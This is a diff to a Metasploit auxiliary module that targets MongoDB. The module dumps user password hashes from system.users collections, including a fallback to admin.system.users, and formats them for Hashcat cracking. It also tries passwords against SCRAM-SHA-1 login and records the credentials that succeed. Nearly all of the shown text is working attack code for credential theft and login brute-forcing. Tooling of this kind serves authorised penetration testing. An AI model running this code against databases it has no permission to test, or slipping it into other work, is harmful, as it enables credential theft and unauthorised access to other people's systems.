@@ -23,6 +23,10 @@ class MetasploitModule < Msf::Auxiliary
           them in the database for later cracking. By default, it dumps system user
           credentials from the 'system.users' collection. Alternatively,
           it can dump application user hashes from a specified collection.
+          On MongoDB 3.0+ all users are stored in admin.system.users regardless
+          of their authentication database, so the default DB of 'admin' is
+          normally correct, and the querying user needs privileges
+          (root, userAdminAnyDatabase, readAnyDatabase) to read them.
 
           The dumped SCRAM hashes are formatted for Hashcat mode 24100 (SCRAM-SHA-1)
           and 24200 (SCRAM-SHA-256), but are not yet wired into Metasploit's
@@ -100,13 +104,32 @@ class MetasploitModule < Msf::Auxiliary
     db = datastore['DB']
     print_status("Dumping MongoDB system users from #{db}.system.users...")
 
+    # numberToReturn 0 lets the server pick its default batch size and keeps
+    # the cursor open; mongodb_query_all drains it with getMore so users past
+    # the first batch are also dumped.
     cmd = BSON::Document.new({})
-    pkt = mongodb_build_packet("#{db}.system.users", cmd.to_bson.to_s, number_to_return: -1)
+    docs = mongodb_query_all(sock, "#{db}.system.users", cmd.to_bson.to_s, timeout: 10)
 
-    sock.put(pkt)
-    resp = sock.get_once(-1, 10)
+    if (error = mongodb_query_error(docs))
+      print_error("Query on #{db}.system.users failed: #{error}")
+      if db != 'admin'
+        print_error('On MongoDB 3.0+ users live in admin.system.users no matter which database')
+        print_error('they authenticate against, and only privileged users can read it. Re-run with')
+        print_error('DB=admin and a user holding root / userAdminAnyDatabase / readAnyDatabase.')
+      end
+      return
+    end
 
-    docs = mongodb_parse_docs(resp)
+    if docs.empty? && db != 'admin'
+      # MongoDB 3.0+ keeps every user in admin.system.users; fall back to it
+      # when the configured database has no system.users collection of its own.
+      print_status("#{db}.system.users is empty, falling back to admin.system.users...")
+      docs = mongodb_query_all(sock, 'admin.system.users', cmd.to_bson.to_s, timeout: 10)
+      if (error = mongodb_query_error(docs))
+        print_error("Query on admin.system.users failed: #{error}")
+        return
+      end
+    end
 
     if docs.empty?
       print_warning('No users found or unable to parse')
@@ -173,12 +196,12 @@ class MetasploitModule < Msf::Auxiliary
     cmd = BSON::Document.new({
       hash_field => { '$exists' => true, '$ne' => '' }
     })
-    pkt = mongodb_build_packet("#{db}.#{coll}", cmd.to_bson.to_s, number_to_return: -1)
+    docs = mongodb_query_all(sock, "#{db}.#{coll}", cmd.to_bson.to_s, timeout: 10)
 
-    sock.put(pkt)
-    resp = sock.get_once(-1, 10)
-
-    docs = mongodb_parse_docs(resp)
+    if (error = mongodb_query_error(docs))
+      print_error("Query on #{db}.#{coll} failed: #{error}")
+      return
+    end
 
     if docs.empty?
       print_warning('No users found or unable to parse')
@@ -244,10 +267,18 @@ class MetasploitModule < Msf::Auxiliary
 
   def auth_scram_sha1(user, password)
     db = datastore['DB']
+    scram_user = mongodb_encode_scram_username(user)
+    if scram_user.nil?
+      vprint_error("Skipping user '#{user}': SCRAM usernames cannot contain a nul byte")
+      return nil
+    end
+
+    # The MONGODB-CR style password digest uses the raw username; only the
+    # SCRAM wire payload needs the RFC 5802 escaping.
     digest_pass = Digest::MD5.hexdigest("#{user}:mongo:#{password}")
 
     client_nonce = Rex::Text.rand_text_alphanumeric(24)
-    auth_payload = "n=#{user},r=#{client_nonce}"
+    auth_payload = "n=#{scram_user},r=#{client_nonce}"
     client_first_bare = auth_payload
     client_first_message = "n,,#{auth_payload}"
 
@@ -259,7 +290,7 @@ class MetasploitModule < Msf::Auxiliary
 
     pkt = mongodb_build_packet("#{db}.$cmd", sasl_start_cmd.to_bson.to_s)
     sock.put(pkt)
-    resp = sock.get_once(-1, 5)
+    resp = mongodb_read_message(sock, 5)
 
     reply = mongodb_parse_doc(resp)
     return nil unless reply && reply['ok'].to_i == 1
@@ -299,9 +330,25 @@ class MetasploitModule < Msf::Auxiliary
 
     pkt = mongodb_build_packet("#{db}.$cmd", sasl_continue_cmd.to_bson.to_s)
     sock.put(pkt)
-    resp = sock.get_once(-1, 5)
+    resp = mongodb_read_message(sock, 5)
 
     reply = mongodb_parse_doc(resp)
+
+    # Some servers leave the SASL conversation open (done: false) and expect
+    # one more empty saslContinue before the session is authenticated.
+    if reply && reply['ok'].to_i == 1 && reply['done'] == false
+      final_cmd = BSON::Document.new({
+        'saslContinue' => BSON::Int32.new(1),
+        'conversationId' => conv_id_bson,
+        'payload' => BSON::Binary.new('')
+      })
+
+      pkt = mongodb_build_packet("#{db}.$cmd", final_cmd.to_bson.to_s)
+      sock.put(pkt)
+      resp = mongodb_read_message(sock, 5)
+      reply = mongodb_parse_doc(resp)
+    end
+
     if reply && reply['ok'].to_i == 1
       print_good("SUCCESSFUL LOGIN '#{user}' : '#{password}' (SCRAM-SHA-1)")
       report_cred(
@@ -334,7 +381,7 @@ class MetasploitModule < Msf::Auxiliary
 
     packet = mongodb_build_packet("#{db}.$cmd", cmd.to_bson.to_s)
     sock.put(packet)
-    response = sock.get_once(-1, 5)
+    response = mongodb_read_message(sock, 5)
 
     reply = mongodb_parse_doc(response)
     if reply && reply['ok'].to_i == 1
@@ -388,7 +435,7 @@ class MetasploitModule < Msf::Auxiliary
     pkt = mongodb_build_packet("#{datastore['DB']}.$cmd", cmd.to_bson.to_s)
 
     sock.put(pkt)
-    response = sock.get_once(-1, 5)
+    response = mongodb_read_message(sock, 5)
 
     doc = mongodb_parse_doc(response)
     doc && doc['ok'].to_i == 1 ? doc['nonce'].to_s : ''
@@ -399,7 +446,7 @@ class MetasploitModule < Msf::Auxiliary
     list_db_pkt = mongodb_build_packet('admin.$cmd', cmd.to_bson.to_s)
 
     sock.put(list_db_pkt)
-    auth_resp = sock.get_once(-1, 5)
+    auth_resp = mongodb_read_message(sock, 5)
 
     mongodb_have_auth_error?(auth_resp)
   end
